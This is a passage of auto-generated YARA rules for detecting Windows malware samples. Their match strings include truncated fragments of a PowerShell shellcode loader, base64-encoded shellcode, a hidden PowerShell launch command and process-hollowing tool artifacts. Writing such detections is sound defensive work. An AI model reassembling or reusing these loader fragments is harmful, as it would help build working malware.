      $s16 = "68696a6b6c6d" ascii /* score: '17.00'*/ /* hex encoded string 'hijklm' */
      $s17 = "6e6e276e6c6e" ascii /* score: '17.00'*/ /* hex encoded string 'nn'nln' */
      $s18 = "5454547b7b7b" ascii /* score: '17.00'*/ /* hex encoded string 'TTT{{{' */
      $s19 = "6c7346726565" ascii /* score: '17.00'*/ /* hex encoded string 'lsFree' */
      $s20 = "756e2d54696d" ascii /* score: '17.00'*/ /* hex encoded string 'un-Tim' */
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule f9d6bf219602f987be31d47917824960cdf466d4be2df33768b9f939054d0928 {
   meta:
      description = "mw - file f9d6bf219602f987be31d47917824960cdf466d4be2df33768b9f939054d0928"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "f9d6bf219602f987be31d47917824960cdf466d4be2df33768b9f939054d0928"
   strings:
      $s1 = "AppPolicyGetProcessTerminationMethod" fullword ascii /* score: '20.00'*/
      $s2 = "0.0.1.0" fullword ascii /* reversed goodware string '0.1.0.0' */ /* score: '16.00'*/
      $s3 = "0.0.0.8" fullword ascii /* reversed goodware string '8.0.0.0' */ /* score: '16.00'*/
      $s4 = "0.0.0.9" fullword ascii /* reversed goodware string '9.0.0.0' */ /* score: '16.00'*/
      $s5 = "0.0.0.41" fullword ascii /* reversed goodware string '14.0.0.0' */ /* score: '16.00'*/
      $s6 = "0.0.0.3" fullword ascii /* reversed goodware string '3.0.0.0' */ /* score: '16.00'*/
      $s7 = "0.0.0.21" fullword ascii /* reversed goodware string '12.0.0.0' */ /* score: '16.00'*/
      $s8 = "0.0.0.2" fullword ascii /* reversed goodware string '2.0.0.0' */ /* score: '16.00'*/
      $s9 = "5.5.5.2" fullword ascii /* reversed goodware string '2.5.5.5' */ /* score: '16.00'*/
      $s10 = "0.0.0.4" fullword ascii /* reversed goodware string '4.0.0.0' */ /* score: '16.00'*/
      $s11 = "0.0.0.11" fullword ascii /* reversed goodware string '11.0.0.0' */ /* score: '16.00'*/
      $s12 = "0.0.0.7" fullword ascii /* reversed goodware string '7.0.0.0' */ /* score: '16.00'*/
      $s13 = "0.0.0.6" fullword ascii /* reversed goodware string '6.0.0.0' */ /* score: '16.00'*/
      $s14 = "235.139.70.46" fullword ascii /* score: '14.00'*/ /* hex encoded string '#Q9pF' */
      $s15 = "214.236.30.62" fullword ascii /* score: '14.00'*/ /* hex encoded string '!B60b' */
      $s16 = "232.253.2.128" fullword ascii /* score: '14.00'*/ /* hex encoded string '#"S!(' */
      $s17 = "60.60.204.121" fullword ascii /* score: '14.00'*/ /* hex encoded string '`` A!' */
      $s18 = "59.49.60.60" fullword ascii /* score: '14.00'*/ /* hex encoded string 'YI``' */
      $s19 = "243.9.50.48" fullword ascii /* score: '14.00'*/ /* hex encoded string '$9PH' */
      $s20 = "68.36.48.68" fullword ascii /* score: '14.00'*/ /* hex encoded string 'h6Hh' */
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      8 of them
}

rule sig_93bfdfde9a2f2cb9d8f3ff79dd0a04a1fae35c6e769316f5e911c9ab168d2d3c {
   meta:
      description = "mw - file 93bfdfde9a2f2cb9d8f3ff79dd0a04a1fae35c6e769316f5e911c9ab168d2d3c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "93bfdfde9a2f2cb9d8f3ff79dd0a04a1fae35c6e769316f5e911c9ab168d2d3c"
   strings:
      $x1 = "c:\\windows\\system32\\svchost.exe" fullword wide /* score: '37.00'*/
      $x2 = "C:\\Users\\jazzb\\source\\repos\\OSEP\\JazzHallow\\obj\\x64\\Release\\JazzHallow.pdb" fullword ascii /* score: '33.00'*/
      $s3 = "JazzHallow.exe" fullword wide /* score: '22.00'*/
      $s4 = "PROCESSBASICINFORMATION" fullword ascii /* score: '17.50'*/
      $s5 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s6 = "ProcessHollowing" fullword ascii /* score: '15.00'*/
      $s7 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii /* score: '11.00'*/
      $s8 = ".NET Framework 4.7.2" fullword ascii /* score: '10.00'*/
      $s9 = ".NETFramework,Version=v4.7.2" fullword ascii /* score: '10.00'*/
      $s10 = "PebAddress" fullword ascii /* score: '7.00'*/
      $s11 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" fullword ascii /* score: '7.00'*/
      $s12 = "retlen" fullword ascii /* score: '5.00'*/
      $s13 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '5.00'*/
      $s14 = "CREATE_SUSPENDED" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.99'*/ /* Goodware String - occured 6 times */
      $s15 = "Program" fullword ascii /* PEStudio Blacklist: strings */ /* score: '4.81'*/ /* Goodware String - occured 194 times */
      $s16 = "  </trustInfo>" fullword ascii /* score: '4.00'*/
      $s17 = "JazzHallow" fullword wide /* score: '4.00'*/
      $s18 = "procInformation" fullword ascii /* score: '4.00'*/
      $s19 = "MoreReserved" fullword ascii /* score: '4.00'*/
      $s20 = "lpNumberOfbytesRW" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_2c683d112d528b63dfaa7ee0140eebc4960fe4fad6292c9456f2fbb4d2364680 {
   meta:
      description = "mw - file 2c683d112d528b63dfaa7ee0140eebc4960fe4fad6292c9456f2fbb4d2364680"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "2c683d112d528b63dfaa7ee0140eebc4960fe4fad6292c9456f2fbb4d2364680"
   strings:
      $x1 = "rwXRzuPgvutxxjOvbZUWejvaCO.run('%windir%\\\\System32\\\\' + ckFMmsPAsm + ' /c powershell -w 1 -C \"sv Ki -;sv xP ec;sv s ((gv Ki" ascii /* score: '36.00'*/
      $x2 = "rwXRzuPgvutxxjOvbZUWejvaCO.run('%windir%\\\\System32\\\\' + ckFMmsPAsm + ' /c powershell -w 1 -C \"sv Ki -;sv xP ec;sv s ((gv Ki" ascii /* score: '32.00'*/
      $s3 = "iACwAMAB4ADgANgAsADAAeAA1AGQALAAwAHgANgA4ACwAMAB4ADMAMwAsADAAeAAzADIALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANwA3ACwAMAB" ascii /* base64 encoded string ' , 0 x 8 6 , 0 x 5 d , 0 x 6 8 , 0 x 3 3 , 0 x 3 2 , 0 x 0 0 , 0 x 0 0 , 0 x 6 8 , 0 x 7 7 , 0 ' */ /* score: '21.00'*/
      $s4 = "sADAAeAA1ADYALAAwAHgANgBhACwAMAB4ADAAMAAsADAAeAA2ADgALAAwAHgANQA4ACwAMAB4AGEANAAsADAAeAA1ADMALAAwAHgAZQA1ACwAMAB4AGYAZgAsADAAeAB" ascii /* base64 encoded string ' 0 x 5 6 , 0 x 6 a , 0 x 0 0 , 0 x 6 8 , 0 x 5 8 , 0 x a 4 , 0 x 5 3 , 0 x e 5 , 0 x f f , 0 x ' */ /* score: '21.00'*/
      $s5 = "4AGUAMgAsADAAeAA1ADgALAAwAHgAOABiACwAMAB4ADUAOAAsADAAeAAyADQALAAwAHgAMAAxACwAMAB4AGQAMwAsADAAeAA2ADYALAAwAHgAOABiACwAMAB4ADAAYwA" ascii /* base64 encoded string ' e 2 , 0 x 5 8 , 0 x 8 b , 0 x 5 8 , 0 x 2 4 , 0 x 0 1 , 0 x d 3 , 0 x 6 6 , 0 x 8 b , 0 x 0 c ' */ /* score: '21.00'*/
      $s6 = "sADAAeABkADUALAAwAHgAYgA4ACwAMAB4ADkAMAAsADAAeAAwADEALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAyADkALAAwAHgAYwA0ACwAMAB4ADUANAAsADAAeAA" ascii /* base64 encoded string ' 0 x d 5 , 0 x b 8 , 0 x 9 0 , 0 x 0 1 , 0 x 0 0 , 0 x 0 0 , 0 x 2 9 , 0 x c 4 , 0 x 5 4 , 0 x ' */ /* score: '21.00'*/
      $s7 = "wAHgAMAAyACwAMAB4ADIAYwAsADAAeAAyADAALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeABlADIALAAwAHgAZgA" ascii /* base64 encoded string ' x 0 2 , 0 x 2 c , 0 x 2 0 , 0 x c 1 , 0 x c f , 0 x 0 d , 0 x 0 1 , 0 x c 7 , 0 x e 2 , 0 x f ' */ /* score: '21.00'*/
      $s8 = "wAHgAMwAxACwAMAB4AGMAMAAsADAAeABhAGMALAAwAHgAYwAxACwAMAB4AGMAZgAsADAAeAAwAGQALAAwAHgAMAAxACwAMAB4AGMANwAsADAAeAAzADgALAAwAHgAZQA" ascii /* base64 encoded string ' x 3 1 , 0 x c 0 , 0 x a c , 0 x c 1 , 0 x c f , 0 x 0 d , 0 x 0 1 , 0 x c 7 , 0 x 3 8 , 0 x e ' */ /* score: '21.00'*/
      $s9 = "wAHgANQAwACwAMAB4ADUAMAAsADAAeAA0ADAALAAwAHgANQAwACwAMAB4ADQAMAAsADAAeAA1ADAALAAwAHgANgA4ACwAMAB4AGUAYQAsADAAeAAwAGYALAAwAHgAZAB" ascii /* base64 encoded string ' x 5 0 , 0 x 5 0 , 0 x 4 0 , 0 x 5 0 , 0 x 4 0 , 0 x 5 0 , 0 x 6 8 , 0 x e a , 0 x 0 f , 0 x d ' */ /* score: '21.00'*/
      $s10 = "wAHgANgA4ACwAMAB4AGYAMAAsADAAeABiADUALAAwAHgAYQAyACwAMAB4ADUANgAsADAAeABmAGYALAAwAHgAZAA1ACwAMAB4ADYAYQAsADAAeAAwADAALAAwAHgANgB" ascii /* base64 encoded string ' x 6 8 , 0 x f 0 , 0 x b 5 , 0 x a 2 , 0 x 5 6 , 0 x f f , 0 x d 5 , 0 x 6 a , 0 x 0 0 , 0 x 6 ' */ /* score: '21.00'*/
      $s11 = "kADUALAAwAHgAOQAzACwAMAB4ADUAMwAsADAAeAA2AGEALAAwAHgAMAAwACwAMAB4ADUANgAsADAAeAA1ADMALAAwAHgANQA3ACwAMAB4ADYAOAAsADAAeAAwADIALAA" ascii /* base64 encoded string ' 5 , 0 x 9 3 , 0 x 5 3 , 0 x 6 a , 0 x 0 0 , 0 x 5 6 , 0 x 5 3 , 0 x 5 7 , 0 x 6 8 , 0 x 0 2 , ' */ /* score: '21.00'*/
      $s12 = "gAC0AbgBhAG0AZQBzAHAAYQBjAGUAIABXAGkAbgAzADIARgB1AG4AYwB0AGkAbwBuAHMAIAAtAHAAYQBzAHMAdABoAHIAdQA7AFsAQgB5AHQAZQBbAF0AXQA7AFsAQgB" ascii /* base64 encoded string ' - n a m e s p a c e   W i n 3 2 F u n c t i o n s   - p a s s t h r u ; [ B y t e [ ] ] ; [ B ' */ /* score: '21.00'*/
      $s13 = "wAHgAZAA5ACwAMAB4AGMAOAAsADAAeAA1AGYALAAwAHgAZgBmACwAMAB4AGQANQAsADAAeAAwADEALAAwAHgAYwAzACwAMAB4ADIAOQAsADAAeABjADYALAAwAHgAOAA" ascii /* base64 encoded string ' x d 9 , 0 x c 8 , 0 x 5 f , 0 x f f , 0 x d 5 , 0 x 0 1 , 0 x c 3 , 0 x 2 9 , 0 x c 6 , 0 x 8 ' */ /* score: '21.00'*/
      $s14 = "5AHQAZQBbAF0AXQAkAGEATgAgAD0AIAAwAHgAZgBjACwAMAB4AGUAOAAsADAAeAA4ADkALAAwAHgAMAAwACwAMAB4ADAAMAAsADAAeAAwADAALAAwAHgANgAwACwAMAB" ascii /* base64 encoded string ' t e [ ] ] $ a N   =   0 x f c , 0 x e 8 , 0 x 8 9 , 0 x 0 0 , 0 x 0 0 , 0 x 0 0 , 0 x 6 0 , 0 ' */ /* score: '21.00'*/
      $s15 = "0AGEALAAwAHgAMgA2ACwAMAB4ADMAMQAsADAAeABmAGYALAAwAHgAMwAxACwAMAB4AGMAMAAsADAAeABhAGMALAAwAHgAMwBjACwAMAB4ADYAMQAsADAAeAA3AGMALAA" ascii /* base64 encoded string ' a , 0 x 2 6 , 0 x 3 1 , 0 x f f , 0 x 3 1 , 0 x c 0 , 0 x a c , 0 x 3 c , 0 x 6 1 , 0 x 7 c , ' */ /* score: '21.00'*/
      $s16 = "4ADMAMQAsADAAeABhAGUALAAwAHgANgA4ACwAMAB4ADAAMgAsADAAeAAwADAALAAwAHgAMAAxACwAMAB4AGIAYgAsADAAeAA4ADkALAAwAHgAZQA2ACwAMAB4ADYAYQA" ascii /* base64 encoded string ' 3 1 , 0 x a e , 0 x 6 8 , 0 x 0 2 , 0 x 0 0 , 0 x 0 1 , 0 x b b , 0 x 8 9 , 0 x e 6 , 0 x 6 a ' */ /* score: '21.00'*/
      $s17 = "4ADgAOQAsADAAeABlADUALAAwAHgAMwAxACwAMAB4AGQAMgAsADAAeAA2ADQALAAwAHgAOABiACwAMAB4ADUAMgAsADAAeAAzADAALAAwAHgAOABiACwAMAB4ADUAMgA" ascii /* base64 encoded string ' 8 9 , 0 x e 5 , 0 x 3 1 , 0 x d 2 , 0 x 6 4 , 0 x 8 b , 0 x 5 2 , 0 x 3 0 , 0 x 8 b , 0 x 5 2 ' */ /* score: '21.00'*/
      $s18 = "wAHgANQBhACwAMAB4ADUAMQAsADAAeABmAGYALAAwAHgAZQAwACwAMAB4ADUAOAAsADAAeAA1AGYALAAwAHgANQBhACwAMAB4ADgAYgAsADAAeAAxADIALAAwAHgAZQB" ascii /* base64 encoded string ' x 5 a , 0 x 5 1 , 0 x f f , 0 x e 0 , 0 x 5 8 , 0 x 5 f , 0 x 5 a , 0 x 8 b , 0 x 1 2 , 0 x e ' */ /* score: '21.00'*/
      $s19 = "wADEALAAwAHgAZAAwACwAMAB4ADgAOQAsADAAeAA0ADQALAAwAHgAMgA0ACwAMAB4ADIANAAsADAAeAA1AGIALAAwAHgANQBiACwAMAB4ADYAMQAsADAAeAA1ADkALAA" ascii /* base64 encoded string ' 1 , 0 x d 0 , 0 x 8 9 , 0 x 4 4 , 0 x 2 4 , 0 x 2 4 , 0 x 5 b , 0 x 5 b , 0 x 6 1 , 0 x 5 9 , ' */ /* score: '21.00'*/
      $s20 = "lADMALAAwAHgAMwBjACwAMAB4ADQAOQAsADAAeAA4AGIALAAwAHgAMwA0ACwAMAB4ADgAYgAsADAAeAAwADEALAAwAHgAZAA2ACwAMAB4ADMAMQAsADAAeABmAGYALAA" ascii /* base64 encoded string ' 3 , 0 x 3 c , 0 x 4 9 , 0 x 8 b , 0 x 3 4 , 0 x 8 b , 0 x 0 1 , 0 x d 6 , 0 x 3 1 , 0 x f f , ' */ /* score: '21.00'*/
   condition:
      uint16(0) == 0x733c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_6269b7ab2f3b4469a4a5840ffad0f4ddf0af9f387a25d227ce3aba38992c5c47 {
   meta:
      description = "mw - file 6269b7ab2f3b4469a4a5840ffad0f4ddf0af9f387a25d227ce3aba38992c5c47"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "6269b7ab2f3b4469a4a5840ffad0f4ddf0af9f387a25d227ce3aba38992c5c47"
   strings:
      $s1 = "$faRoi = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Ee kernel32.dll VirtualAlloc), (iq @([IntPtr]," wide /* score: '27.00'*/
      $s2 = "$lr = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equ" wide /* score: '24.00'*/
      $s3 = "return $vwFz.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New" wide /* score: '15.00'*/
      $s4 = "$I = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bMwV, (iq @([IntPtr]) ([Void])))" fullword wide /* score: '15.00'*/
      $s5 = "$vwFz = $lr.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))" fullword wide /* score: '11.00'*/
      $s6 = "$H.DefineMethod('Invo'+'ke', 'Public, HideBySig, NewSlot, Virtual', $xVjH, $Sq).SetImplementationFlags('Runtime, Managed')" fullword wide /* score: '10.00'*/
      $s7 = "[System.Runtime.InteropServices.Marshal]::Copy($bcbq, 0, $bMwV, $bcbq.length)" fullword wide /* score: '10.00'*/
      $s8 = "If ([IntPtr]::size -eq 8) {" fullword wide /* score: '8.00'*/
      $s9 = "for ($x = 0; $x -lt $bcbq.Count; $x++) {" fullword wide /* score: '8.00'*/
      $s10 = "$bcbq[$x] = $bcbq[$x] -bxor 136" fullword wide /* score: '8.00'*/
      $s11 = "$H = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System." wide /* score: '6.00'*/
      $s12 = "$H.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Sq).SetImplementatio" wide /* score: '6.00'*/
      $s13 = "function Ee {" fullword wide /* score: '4.00'*/
      $s14 = "Param ($CqA, $oUOE)" fullword wide /* score: '4.00'*/
      $s15 = "function iq {" fullword wide /* score: '4.00'*/
      $s16 = "Param (" fullword wide /* score: '4.00'*/
      $s17 = "[Parameter(Position = 0, Mandatory = $True)] [Type[]] $Sq," fullword wide /* score: '4.00'*/
      $s18 = "[Parameter(Position = 1)] [Type] $xVjH = [Void]" fullword wide /* score: '4.00'*/
      $s19 = "return $H.CreateType()" fullword wide /* score: '4.00'*/
      $s20 = "[Byte[]]$bcbq = [Byte[]](116,192,11,108,120,96,64,136,136,136,201,217,201,216,218,217,222,192,185,90,237,192,3,218,232,192,3,218" wide /* score: '4.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 30KB and
      8 of them
}

rule ea5632822d50a8da913a750da7f1e379ecc0af3395ef9bf47f2fb198f5e6df25 {
   meta:
      description = "mw - file ea5632822d50a8da913a750da7f1e379ecc0af3395ef9bf47f2fb198f5e6df25"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "ea5632822d50a8da913a750da7f1e379ecc0af3395ef9bf47f2fb198f5e6df25"
   strings:
      $x1 = "TableTypeColumnValue_ValidationNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValueIden" ascii /* score: '66.00'*/
      $x2 = "alse.If the expression syntax is invalid, the engine will terminate, returning iesBadActionData.SequenceNumber that determines t" ascii /* score: '41.00'*/
      $x3 = "stallFinalizeExecuteActionPublishFeaturesPublishProductmysetup1{4736E7A8-1180-44CD-A2D0-B91225372BD5}TempFoldersvchost.exeTARGET" ascii /* score: '39.00'*/
      $x4 = "dminUISequenceAdvtExecuteSequenceComponentPrimary key used to identify a particular component record.ComponentIdGuidA string GUI" ascii /* score: '31.00'*/
      $s5 = "lumnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression whi" ascii /* score: '23.00'*/
      $s6 = "he sort order in which the actions are to be executed.  Leave blank to suppress action.AdminUISequenceAdvtExecuteSequenceCompone" ascii /* score: '21.00'*/
      $s7 = "ntPrimary key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and" ascii /* score: '20.00'*/
      $s8 = "om the Directory table.AttributesRemote execution option, one of irsEnumA conditional statement that will disable this component" ascii /* score: '18.00'*/
      $s9 = "with respect to the media images; order must track cabinet order.InstallExecuteSequenceInstallUISequenceLaunchConditionExpressio" ascii /* score: '17.00'*/
      $s10 = "ionData.SequenceNumber that determines the sort order in which the actions are to be executed.  Leave blank to suppress action.A" ascii /* score: '17.00'*/
      $s11 = "me of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Condition;Guid;Path;Version;Langu" ascii /* score: '17.00'*/
      $s12 = "DETECTEDA newer version is already installed.#myapplication.cabALLUSERS1MSIUSEREALADMINDETECTIONManufacturerMicrosoft Corporatio" ascii /* score: '16.00'*/
      $s13 = "execution option, one of irsEnumA conditional statement that will disable this component if the specified condition evaluates to" ascii /* score: '15.00'*/
      $s14 = "f the code.TargetFormattedExcecution parameter, depends on the type of custom actionExtendedTypeA numeric custom action type tha" ascii /* score: '14.00'*/
      $s15 = "ourceThe table reference of the source of the code.TargetFormattedExcecution parameter, depends on the type of custom actionExte" ascii /* score: '14.00'*/
      $s16 = ";24;25;26;32;33;34;36;37;38;48;49;50;52;53;54Feature attributesFeatureComponentsFeature_Foreign key into Feature table.Component" ascii /* score: '14.00'*/
      $s17 = "D unique to this component, version, and language.Directory_DirectoryRequired key of a Directory table record. This is actually " ascii /* score: '13.00'*/
      $s18 = "binet.VolumeLabelThe label attributed to the volume.PropertyThe property defining the location of the cabinet file.MsiFileHashFi" ascii /* score: '13.00'*/
      $s19 = "a root of the install tree.DefaultDirThe default sub-path under parent's path.FeaturePrimary key used to identify a particular f" ascii /* score: '13.00'*/
      $s20 = "ot item.TitleShort text identifying a visible feature item.Longer descriptive text descr" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule f0851c538e61353570d558ef39be103b8ddb5427e33f9e8b4ab991ea34a5942c {
   meta:
      description = "mw - file f0851c538e61353570d558ef39be103b8ddb5427e33f9e8b4ab991ea34a5942c"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2023-07-19"
      hash1 = "f0851c538e61353570d558ef39be103b8ddb5427e33f9e8b4ab991ea34a5942c"
   strings:
      $s1 = "zNiwxMDAsNDYsNzAsNSw2NSwxNDgsODQsMjQyLDEzMSwxNiwyNDAsMjEyLDY1LDE2MCwxODksMjI3LDMyLDE0OSwyMzcsNzAsMTYyLDUwLDExMCw5MCwzNCw1OSwxMTc" ascii /* base64 encoded string '6,100,46,70,5,65,148,84,242,131,16,240,212,65,160,189,227,32,149,237,70,162,50,110,90,34,59,117' */ /* score: '21.00'*/
      $s2 = "5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJGJNd1YsIChpcSBAKFtJbnRQdHJdKSAoW1Z" ascii /* base64 encoded string 'stem.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bMwV, (iq @([IntPtr]) ([V' */ /* score: '21.00'*/
      $s3 = "4NSw2NSwyMTgsMjE4LDIwMSw1MCwxNjUsMTQyLDE0NCwyNDMsMTE5LDkzLDEzLDcyLDEzNSwxMywyMSwxMzcsMTM2LDEzNiwxOTIsMTE5LDcxLDEzNSwxMiw0LDEzNyw" ascii /* base64 encoded string '5,65,218,218,201,50,165,142,144,243,119,93,13,72,135,13,21,137,136,136,192,119,71,135,12,4,137,' */ /* score: '21.00'*/
      $s4 = "dXSRiY2JxID0gW0J5dGVbXV0oMTE2LDE5MiwxMSwxMDgsMTIwLDk2LDY0LDEzNiwxMzYsMTM2LDIwMSwyMTcsMjAxLDIxNiwyMTgsMjE3LDIyMiwxOTIsMTg1LDkwLDI" ascii /* base64 encoded string ']$bcbq = [Byte[]](116,192,11,108,120,96,64,136,136,136,201,217,201,216,218,217,222,192,185,90,2' */ /* score: '21.00'*/
      $s5 = "zLDE5MiwxNDQsMjA0LDMsMjAwLDE2OCwxOTMsMTM3LDg4LDEwNywyMjIsMTkyLDExOSw2NSwyMDEsMywxODgsMCwxOTIsMTM3LDk0LDE5NywxODUsNjUsMTkyLDE4NSw" ascii /* base64 encoded string ',192,144,204,3,200,168,193,137,88,107,222,192,119,65,201,3,188,0,192,137,94,197,185,65,192,185,' */ /* score: '21.00'*/
      $s6 = "zNywxOTIsMywyMTgsMjMyLDE5MiwzLDIxOCwxNDQsMTkyLDMsMjE4LDE2OCwxOTIsMywyNTAsMjE2LDE5MiwxMzUsNjMsMTk0LDE5NCwxOTcsMTg1LDY1LDE5MiwxODU" ascii /* base64 encoded string '7,192,3,218,232,192,3,218,144,192,3,218,168,192,3,250,216,192,135,63,194,194,197,185,65,192,185' */ /* score: '21.00'*/
      $s7 = "5LDE0MCwxMzYsMTM2LDEzNiwyMDEsNTAsMjUzLDIwNiwyMiwxNCwxMTksOTMsMTkyLDEsMTIxLDE5MiwxLDgyLDE5Myw3OSw3MiwxMTksMTE5LDExOSwxMTksMTk3LDE" ascii /* base64 encoded string ',140,136,136,136,201,50,253,206,22,14,119,93,192,1,121,192,1,82,193,79,72,119,119,119,119,197,1' */ /* score: '21.00'*/
      $s8 = "xMzYsMTM2LDk5LDU5LDk3LDEwOCwxMzcsMTM2LDEzNiw5NiwxMCwxMTksMTE5LDExOSwxNjcsMjIxLDI0OCwyMzYsMjMzLDI1MiwyMzcsMTY3LDI1NCwxODksMTY2LDE" ascii /* base64 encoded string '36,136,99,59,97,108,137,136,136,96,10,119,119,119,167,221,248,236,233,252,237,167,254,189,166,1' */ /* score: '21.00'*/
      $s9 = "sNzIsMzYsMTgwLDIzMywyNDQsMTM4LDE2NCwxNjgsMjAxLDczLDY1LDEzMywyMDEsMTM3LDczLDEwNiwxMDEsMjE4LDIwMSwyMTcsMTkyLDMsMjE4LDE2OCwzLDIwMiw" ascii /* base64 encoded string '72,36,180,233,244,138,164,168,201,73,65,133,201,137,73,106,101,218,201,217,192,3,218,168,3,202,' */ /* score: '21.00'*/
      $s10 = "4NywxODUsMTY3LDE5MCwyMDcsMTc2LDE3NywxOTMsMjA5LDIwNiwyMDQsMjEwLDEzNiwyNTEsMjQ0LDE3NSw4NywxNTQsMTA3LDI0LDk3LDEyMiw5Myw0NSwxMSw4OCw" ascii /* base64 encoded string '7,185,167,190,207,176,177,193,209,206,204,210,136,251,244,175,87,154,107,24,97,122,93,45,11,88,' */ /* score: '21.00'*/
      $s11 = "xODAsMTkyLDEzNyw4OCwyMzgsOSwyNDAsMTQ0LDEzMSwxMzgsMjUzLDI1MCwzLDgsMCwxMzYsMTM2LDEzNiwxOTIsMTMsNzIsMjUyLDIzOSwxOTIsMTM3LDg4LDIxNiw" ascii /* base64 encoded string '80,192,137,88,238,9,240,144,131,138,253,250,3,8,0,136,136,136,192,13,72,252,239,192,137,88,216,' */ /* score: '21.00'*/
      $s12 = "yc2hhbF06OkdldERlbGVnYXRlRm9yRnVuY3Rpb25Qb2ludGVyKChFZSBrZXJuZWwzMi5kbGwgVmlydHVhbEFsbG9jKSwgKGlxIEAoW0ludFB0cl0sIFtVSW50MzJdLCB" ascii /* base64 encoded string 'shal]::GetDelegateForFunctionPointer((Ee kernel32.dll VirtualAlloc), (iq @([IntPtr], [UInt32], ' */ /* score: '21.00'*/
      $s13 = "sMTkyLDEzNyw3NSwxMyw3MiwyNTMsOTUsMjA4LDIwOCwyMDgsMTkyLDE0MSw2LDEzOSwxMzYsMTM2LDIxNiw3NSw5NiwyNDcsMTE3LDExOSwxMTksMTg4LDE4OSwxNjY" ascii /* base64 encoded string '192,137,75,13,72,253,95,208,208,208,192,141,6,139,136,136,216,75,96,247,117,119,119,188,189,166' */ /* score: '21.00'*/
      $s14 = "nRhdGlvbkZsYWdzKCdSdW50aW1lLCBNYW5hZ2VkJykNCgkkSC5EZWZpbmVNZXRob2QoJ0ludm8nKydrZScsICdQdWJsaWMsIEhpZGVCeVNpZywgTmV3U2xvdCwgVmlyd" ascii /* score: '16.00'*/
      $s15 = "FB1YmxpYywgU2VhbGVkLCBBbnNpQ2xhc3MsIEF1dG9DbGFzcycsIFtTeXN0ZW0uTXVsdGljYXN0RGVsZWdhdGVdKQ0KCSRILkRlZmluZUNvbnN0cnVjdG9yKCdSVFNwZ" ascii /* score: '16.00'*/
      $s16 = "$All = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a1+$a2+$a3+$a4+$a5+$a6+$a7+$a8))" fullword ascii /* score: '16.00'*/
      $s17 = "GhvZCgnR2V0UHJvY0FkZHJlc3MnLCBbVHlwZVtdXSBAKCdTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuSGFuZGxlUmVmJywgJ3N0cmluZycpKQ0KCXJldHVyb" ascii /* score: '11.00'*/
      $s18 = "VstMV0uRXF1YWxzKCdTeXN0ZW0uZGxsJykgfSkuR2V0VHlwZSgnTWljcm9zb2Z0LldpbjMyLlVuc2FmZU5hdGl2ZU1ldGhvZHMnKQ0KCSR2d0Z6ID0gJGxyLkdldE1ld" ascii /* score: '11.00'*/
      $s19 = "3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpKSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQ" ascii /* score: '11.00'*/
      $s20 = "wyMzAsMjcsMTY3LDIyMSw1OCwxMzgsMTY5LDEwOSwyMSwxNzIsMjM4LDk3LDEyMywxMTgsMTM1LDE2Myw4NCwxNTUsNTYsODcsMzAsMjMyLDYsMjA1LDM0LDEyNywxMz" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6124 and filesize < 20KB and
      8 of them
}

/* Super Rules ------------------------------------------------------------- */

rule _790154dd50acc1d6c631d9db53d857cb489403b05a741d3954b777d3fec2d9c6_eabb8e162f4c30c1157b0a4758ca5076f18cf4e31d7571020635dedd8d_0 {
   meta:
